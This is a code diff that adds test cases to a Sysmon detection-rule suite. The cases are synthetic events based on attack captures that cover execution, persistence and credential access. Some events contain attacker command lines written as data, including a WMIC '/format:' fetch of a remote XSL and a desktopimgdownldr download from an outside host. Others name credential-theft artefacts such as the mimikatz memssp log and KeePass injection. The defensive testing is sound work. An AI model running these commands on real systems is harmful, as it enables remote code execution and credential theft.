@@ -2971,6 +2971,391 @@ CASES = [
         False,
         event(18, PipeName=r"\browser"),
     ),
+    # --- Execution/Persistence/Credential-Access gap-closure batch (SYS-221..239) ---
+    # Grounded in real EVTX-ATTACK-SAMPLES captures, re-validated against the
+    # full 278-file corpus (all categories, not just the target three) to
+    # catch cross-category false positives.
+    # SYS-005 widened: legacy IE joins the browser/mail-client parent list.
+    # Taken from sysmon_mshta_sharpshooter_stageless_meterpreter.evtx.
+    (
+        "SYS-005",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Program Files\Internet Explorer\iexplore.exe",
+            image=r"C:\Windows\System32\mshta.exe",
+        ),
+    ),
+    # SYS-060/SYS-194 widened: kekeo's default TSSSP credential-relay pipe.
+    # Taken from sysmon17_18_kekeo_tsssp_default_np.evtx.
+    (
+        "SYS-060",
+        True,
+        event(17, PipeName=r"\kekeo_tsssp_endpoint"),
+    ),
+    (
+        "SYS-194",
+        True,
+        event(18, PipeName=r"\kekeo_tsssp_endpoint"),
+    ),
+    # SYS-122 widened: the HKU\<SID>_Classes per-user hive form (underscore,
+    # not \Classes\) and the {Default} value spelling, alongside the
+    # already-tested HKCU\Software\Classes\...\(Default) form. Taken from a
+    # real Turla-style Outlook COM-hijack capture.
+    (
+        "SYS-122",
+        True,
+        event(
+            13,
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES"
+                r"\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}"
+                r"\InProcServer32\{Default}"
+            ),
+            Details=r"C:\Users\User\Documents\mapid.tlb",
+            EventType="SetValue",
+        ),
+    ),
+    # --- MSI custom action ran a temp binary in the Installer cache (SYS-221) ---
+    # Taken from Exec_sysmon_meterpreter_reversetcp_msipackage.evtx.
+    (
+        "SYS-221",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\System32\msiexec.exe",
+            image=r"C:\Windows\Installer\MSI4FFD.tmp",
+        ),
+    ),
+    (
+        "SYS-221",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\System32\msiexec.exe",
+            image=r"C:\Program Files\App\app.exe",
+        ),
+    ),
+    # --- Compiled HTML Help viewer spawned a shell (SYS-222) ---
+    # Taken from Sysmon_Exec_CompiledHTML.evtx.
+    (
+        "SYS-222",
+        True,
+        event(1, parent_image=r"C:\Windows\hh.exe", image=r"C:\Windows\System32\cmd.exe"),
+    ),
+    (
+        "SYS-222",
+        False,
+        event(1, parent_image=r"C:\Windows\hh.exe", image=r"C:\Windows\notepad.exe"),
+    ),
+    # --- msxsl.exe executed an XSL stylesheet (SYS-223) ---
+    # Taken from exec_msxsl_xsl_sysmon_1_7.evtx.
+    (
+        "SYS-223",
+        True,
+        event(1, image=r"\\vboxsrv\HTools\msxsl.exe"),
+    ),
+    # --- WMIC Squiblytwo, remote XSL via /format: (SYS-224) ---
+    # Taken from exec_wmic_xsl_internet_sysmon_3_1_11.evtx.
+    (
+        "SYS-224",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\wbem\WMIC.exe",
+            command_line=r'wmic  process list /format:"https://a.uguu.se/test.xsl"',
+        ),
+    ),
+    (
+        "SYS-224",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\wbem\WMIC.exe",
+            command_line=r"wmic process list /format:csv.xsl",
+        ),
+    ),
+    # --- MSBuild spawned a shell (SYS-225) ---
+    # Taken from execution_evasion_visual_studio_prebuild_event.evtx.
+    (
+        "SYS-225",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
+            image=r"C:\Windows\SysWOW64\cmd.exe",
+        ),
+    ),
+    (
+        "SYS-225",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
+            image=r"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.26.28801\bin\Hostx86\x86\cl.exe",
+        ),
+    ),
+    # --- svchost's DcomLaunch group spawned a shell (SYS-226) ---
+    # Taken from revshell_cmd_svchost_sysmon_1.evtx.
+    (
+        "SYS-226",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\System32\svchost.exe",
+            parent_command_line=r"C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay",
+            image=r"C:\Windows\System32\cmd.exe",
+        ),
+    ),
+    (
+        "SYS-226",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\System32\svchost.exe",
+            parent_command_line=r"C:\Windows\system32\svchost.exe -k DcomLaunch",
+            image=r"C:\Windows\System32\rundll32.exe",
+        ),
+    ),
+    # --- explorer.exe /root, launch (SYS-227) ---
+    # Taken from susp_explorer_exec_root_cmdline_@rimpq_@CyberRaiju.evtx.
+    (
+        "SYS-227",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\explorer.exe",
+            command_line=r'explorer.exe  /root,"c:\windows\System32\calc.exe"',
+        ),
+    ),
+    (
+        "SYS-227",
+        False,
+        event(1, image=r"C:\Windows\explorer.exe", command_line=r"C:\Windows\Explorer.EXE"),
+    ),
+    # --- desktopimgdownldr.exe LOLBAS download (SYS-228) ---
+    # Taken from sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx.
+    (
+        "SYS-228",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\desktopimgdownldr.exe",
+            command_line=r"desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Bin.7z /eventName:desktopimgdownldr",
+        ),
+    ),
+    # --- CLSID redirected to another class via TreatAs (SYS-229) ---
+    # Taken from persist_turla_outlook_backdoor_comhijack.evtx.
+    (
+        "SYS-229",
+        True,
+        event(
+            13,
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES"
+                r"\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs\{Default}"
+            ),
+            Details=r"{49CBB1C7-97D1-485A-9EC1-A26065633066}",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-229",
+        False,
+        event(
+            13,
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES"
+                r"\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\LocalServer32"
+            ),
+            EventType="SetValue",
+        ),
+    ),
+    # --- Well-known Administrator/Guest RID manipulated in the SAM hive (SYS-230) ---
+    # Taken from persist_valid_account_guest_rid_hijack.evtx (Guest, RID 501)
+    # and Sysmon_13_Local_Admin_Password_Changed.evtx (Administrator, RID 500).
+    (
+        "SYS-230",
+        True,
+        event(
+            13,
+            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-230",
+        True,
+        event(
+            13,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F4\ForcePasswordReset",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-230",
+        False,
+        event(
+            13,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000003EA\F",
+            EventType="SetValue",
+        ),
+    ),
+    # --- Logon-screen accessibility tool spawned a child (SYS-231) ---
+    # Taken from persistence_accessibility_features_osk_sysmon1.evtx.
+    (
+        "SYS-231",
+        True,
+        event(1, parent_image=r"C:\Windows\System32\osk.exe", image=r"C:\Windows\System32\whoami.exe"),
+    ),
+    (
+        "SYS-231",
+        False,
+        event(1, parent_image=r"C:\Windows\System32\Utilman.exe", image=r"C:\Windows\System32\osk.exe"),
+    ),
+    # --- Fake pending Group Policy queued in the registry (SYS-232) ---
+    # Taken from persistence_pendingGPO_sysmon_13.evtx.
+    (
+        "SYS-232",
+        True,
+        event(
+            13,
+            image=r"C:\Windows\regedit.exe",
+            TargetObject=(
+                r"HKU\S-1-5-21-3461203602-4096304019-2269080069-1000"
+                r"\Software\Microsoft\IEAK\GroupPolicy\PendingGPOs\Path1"
+            ),
+            Details=r"c:\programdata\gpo.inf",
+            EventType="SetValue",
+        ),
+    ),
+    # --- Startup special folder redirected via User Shell Folders (SYS-233) ---
+    # Taken from persistence_startup_UserShellStartup_Folder_Changed_sysmon_13.evtx.
+    (
+        "SYS-233",
+        True,
+        event(
+            13,
+            image=r"C:\Windows\system32\reg.exe",
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000"
+                r"\Software\Microsoft\Windows\CurrentVersion\Explorer"
+                r"\User Shell Folders\startup"
+            ),
+            Details=r"c:\programdata\StartupNewHomeAddress",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-233",
+        False,
+        event(
+            13,
+            image=r"C:\Windows\system32\reg.exe",
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000"
+                r"\Software\Microsoft\Windows\CurrentVersion\Explorer"
+                r"\User Shell Folders\Desktop"
+            ),
+            EventType="SetValue",
+        ),
+    ),
+    # --- smss.exe spawned a shell instead of a boot subsystem (SYS-234) ---
+    # Taken from sysmon_1_smss_child_proc_bootexecute_setupexecute.evtx.
+    (
+        "SYS-234",
+        True,
+        event(1, parent_image=r"C:\Windows\System32\smss.exe", image=r"C:\Windows\System32\cmd.exe"),
+    ),
+    (
+        "SYS-234",
+        False,
+        event(1, parent_image=r"C:\Windows\System32\smss.exe", image=r"C:\Windows\System32\csrss.exe"),
+    ),
+    # --- lsass.exe wrote mimikatz's memssp log (SYS-235) ---
+    # Taken from CA_Mimikatz_Memssp_Default_Logs_Sysmon_11.evtx.
+    (
+        "SYS-235",
+        True,
+        event(
+            11,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetFilename=r"C:\Windows\System32\mimilsa.log",
+        ),
+    ),
+    (
+        "SYS-235",
+        False,
+        event(
+            11,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetFilename=r"C:\Windows\System32\lsass.log",
+        ),
+    ),
+    # --- Remote thread created inside KeePass (SYS-236) ---
+    # Taken from CA_keepass_KeeThief_Get-KeePassDatabaseKey.evtx.
+    (
+        "SYS-236",
+        True,
+        event(
+            8,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            TargetImage=r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
+        ),
+    ),
+    # --- Process opened a handle into TeamViewer's memory (SYS-237) ---
+    # Taken from CA_teamviewer-dumper_sysmon_10.evtx.
+    (
+        "SYS-237",
+        True,
+        event(
+            10,
+            image=r"C:\Users\bouss\AppData\Local\Temp\frida-winjector-helper-32.exe",
+            TargetImage=r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
+            GrantedAccess="0x147a",
+        ),
+    ),
+    # --- LSA Secrets value written (SYS-238) ---
+    # Taken from Sysmon13_MachineAccount_Password_Hash_Changed_via_LsarSetSecret.evtx.
+    (
+        "SYS-238",
+        True,
+        event(
+            13,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetObject=r"HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal\(Default)",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-238",
+        False,
+        event(
+            13,
+            image=r"C:\Windows\system32\lsass.exe",
+            TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\bob",
+            EventType="SetValue",
+        ),
+    ),
+    # --- DirectInput MostRecentApplication keylogger artifact (SYS-239) ---
+    # Taken from sysmon_13_keylogger_directx.evtx.
+    (
+        "SYS-239",
+        True,
+        event(
+            13,
+            image=r"C:\Users\IEUser\Desktop\keylogger_directx.exe",
+            TargetObject=(
+                r"HKU\S-1-5-21-3583694148-1414552638-2922671848-1000"
+                r"\Software\Microsoft\DirectInput\MostRecentApplication\Name"
+            ),
+            Details="KEYLOGGER_DIRECTX.EXE",
+            EventType="SetValue",
+        ),
+    ),
 ]
 
 
